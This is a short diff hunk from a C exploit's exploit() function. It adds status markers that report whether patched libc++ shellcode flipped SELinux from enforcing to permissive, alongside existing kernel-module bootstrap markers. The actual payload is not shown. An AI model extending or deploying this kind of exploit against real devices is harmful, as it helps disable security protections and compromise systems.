@@ -567,6 +567,9 @@ static int exploit(void) {
         const char *msg;
         int         rc;
     } markers[] = {
+        /* probe result from the patched libc++ shellcode */
+        { "/dev/dfx1",  "selinux: enforce write OK -> permissive",           5 },
+        { "/dev/dfx0",  "selinux: enforce write DENIED",                     5 },
         { "/dev/df",    "libc++: loading custom module",                    -1 },
         { "/dev/dfm0",  "kernel module: launching bootstrap",               -1 },
         { "/dev/dfm1",  "bootstrap: loading app preferences file",          -1 },
